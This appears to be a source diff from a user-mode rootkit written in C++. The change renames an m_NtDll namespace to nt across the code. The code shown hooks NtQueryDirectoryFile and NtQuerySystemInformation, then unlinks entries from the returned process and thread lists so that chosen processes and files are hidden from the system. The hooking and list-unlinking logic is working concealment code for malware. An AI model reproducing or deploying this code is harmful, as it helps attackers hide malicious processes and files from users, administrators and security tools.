@@ -10,12 +10,12 @@ namespace hk {
 		ptr offset;
 
 		switch (fclass) {
-		case m_NtDll::FileDirectoryInformation:       offset = 64; break;
-		case m_NtDll::FileFullDirectoryInformation:   offset = 68; break;
-		case m_NtDll::FileBothDirectoryInformation:   offset = 81; break;
-		case m_NtDll::FileNamesInformation:           offset = 12; break;
-		case m_NtDll::FileIdBothDirectoryInformation: offset = 89; break;
-		case m_NtDll::FileIdFullDirectoryInformation: offset = 76; break;
+		case nt::FileDirectoryInformation:       offset = 64; break;
+		case nt::FileFullDirectoryInformation:   offset = 68; break;
+		case nt::FileBothDirectoryInformation:   offset = 81; break;
+		case nt::FileNamesInformation:           offset = 12; break;
+		case nt::FileIdBothDirectoryInformation: offset = 89; break;
+		case nt::FileIdFullDirectoryInformation: offset = 76; break;
 		default:
 			return nullptr;
 		}
@@ -23,7 +23,7 @@ namespace hk {
 		return (void*)((ptr)pData + offset);
 	}
 
-	m_NtDll::NtQueryDirectoryFile_t NtQueryDirectoryFile;
+	nt::NtQueryDirectoryFile_t NtQueryDirectoryFile;
 	NTSTATUS NTAPI NtQueryDirectoryFileHook(
 		_In_                       HANDLE          FileHandle,
 		_In_opt_                   HANDLE          Event,
@@ -34,7 +34,7 @@ namespace hk {
 		_In_                       ULONG           Length,
 		_In_                       ULONG           FileInformationClass,
 		_In_                       BOOLEAN         ReturnSingleEntry,
-		_In_opt_               m_NtDll::PUNICODE_STRING FileName,
+		_In_opt_                   PUNICODE_STRING FileName,
 		_In_                       BOOLEAN         RestartScan
 	) {
 		NTSTATUS s = NtQueryDirectoryFile(FileHandle, Event, ApcRoutine,
@@ -44,12 +44,12 @@ namespace hk {
 			return s;
 
 		constexpr u32 fclass[] = {
-			m_NtDll::FileDirectoryInformation,
-			m_NtDll::FileFullDirectoryInformation,
-			m_NtDll::FileBothDirectoryInformation,
-			m_NtDll::FileNamesInformation,
-			m_NtDll::FileIdBothDirectoryInformation,
-			m_NtDll::FileIdFullDirectoryInformation
+			nt::FileDirectoryInformation,
+			nt::FileFullDirectoryInformation,
+			nt::FileBothDirectoryInformation,
+			nt::FileNamesInformation,
+			nt::FileIdBothDirectoryInformation,
+			nt::FileIdFullDirectoryInformation
 		};
 		for (u32 i = 0; i < sizeof(fclass) / sizeof(*fclass); i++)
 			if (FileInformationClass == fclass[i]) {
@@ -82,9 +82,9 @@ namespace hk {
 
 #pragma region NtQuerySystemInformation
 	status UnlinkProcessEntry(
-		_In_ m_NtDll::SYSTEM_PROCESS_INFORMATION* spi
+		_In_ nt::SYSTEM_PROCESS_INFORMATION* spi
 	) {
-		m_NtDll::SYSTEM_PROCESS_INFORMATION* NextEntry = (m_NtDll::SYSTEM_PROCESS_INFORMATION*)
+		nt::SYSTEM_PROCESS_INFORMATION* NextEntry = (nt::SYSTEM_PROCESS_INFORMATION*)
 			((ptr)spi->NextEntryOffset + (ptr)spi);
 		if (NextEntry->NextEntryOffset)
 			spi->NextEntryOffset += NextEntry->NextEntryOffset;
@@ -94,10 +94,10 @@ namespace hk {
 		return spi->NextEntryOffset;
 	}
 	status UnlinkThreadEntry(
-		_In_ m_NtDll::SYSTEM_PROCESS_INFORMATION* spi,
+		_In_ nt::SYSTEM_PROCESS_INFORMATION* spi,
 		_In_     u32                      TId
 	) {
-		m_NtDll::SYSTEM_THREAD_INFORMATION* stit = (m_NtDll::SYSTEM_THREAD_INFORMATION*)(spi + 1);
+		nt::SYSTEM_THREAD_INFORMATION* stit = (nt::SYSTEM_THREAD_INFORMATION*)(spi + 1);
 
 		for (u16 i = 0; i < spi->NumberOfThreads; i++)
 			if ((u32)stit[i].ClientId.UniqueThread == TId) {
@@ -109,7 +109,7 @@ namespace hk {
 		return -1; // ThreadId not Found
 	}
 
-	m_NtDll::NtQuerySystemInformation_t NtQuerySystemInformation;
+	nt::NtQuerySystemInformation_t NtQuerySystemInformation;
 	NTSTATUS NTAPI NtQuerySystemInformationHook(
 		_In_      ULONG  SystemInformationClass,
 		_Out_     PVOID  SystemInformation,
@@ -119,12 +119,12 @@ namespace hk {
 		NTSTATUS s = NtQuerySystemInformation(SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength);
 
 		// Execute hook if SystemProcessInformation and atleast one Entry exists
-		if (SystemInformationClass == 0x05 && SystemInformationLength >= sizeof(m_NtDll::SYSTEM_PROCESS_INFORMATION)) {
+		if (SystemInformationClass == 0x05 && SystemInformationLength >= sizeof(nt::SYSTEM_PROCESS_INFORMATION)) {
 			if (!g_ProcessList->GetItemCount())
 				return s; // No Items to Hide
 
 			// Setup first Process Entry
-			m_NtDll::SYSTEM_PROCESS_INFORMATION* PreviousEntry = (m_NtDll::SYSTEM_PROCESS_INFORMATION*)SystemInformation;
+			nt::SYSTEM_PROCESS_INFORMATION* PreviousEntry = (nt::SYSTEM_PROCESS_INFORMATION*)SystemInformation;
 			do {
 				if (!PreviousEntry->NextEntryOffset)
 					break;
@@ -133,7 +133,7 @@ namespace hk {
 
 			RedoNext:
 				// The current Entry in the List to be inspected
-				m_NtDll::SYSTEM_PROCESS_INFORMATION* CurrentEntry = (m_NtDll::SYSTEM_PROCESS_INFORMATION*)
+				nt::SYSTEM_PROCESS_INFORMATION* CurrentEntry = (nt::SYSTEM_PROCESS_INFORMATION*)
 					((ptr)PreviousEntry->NextEntryOffset + (ptr)PreviousEntry);
 
 				void* Entry = g_ProcessList->GetFirstEntry();
